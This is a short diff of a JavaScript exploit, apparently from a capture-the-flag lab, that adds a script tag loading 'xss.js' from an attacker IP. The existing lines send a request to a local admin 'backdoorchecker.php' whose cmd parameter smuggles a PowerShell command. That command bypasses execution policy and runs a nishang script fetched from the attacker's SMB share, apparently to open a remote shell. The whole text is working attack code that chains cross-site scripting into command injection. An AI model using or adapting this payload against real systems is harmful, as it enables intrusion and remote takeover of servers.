@@ -1,3 +1,5 @@
+<script src=http://10.10.14.39/xss.js></script>
+
 var xhr = new XMLHttpRequest();
 var url = "http://localhost/admin/backdoorchecker.php";
 var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.39\\Red\\nishang.ps1";
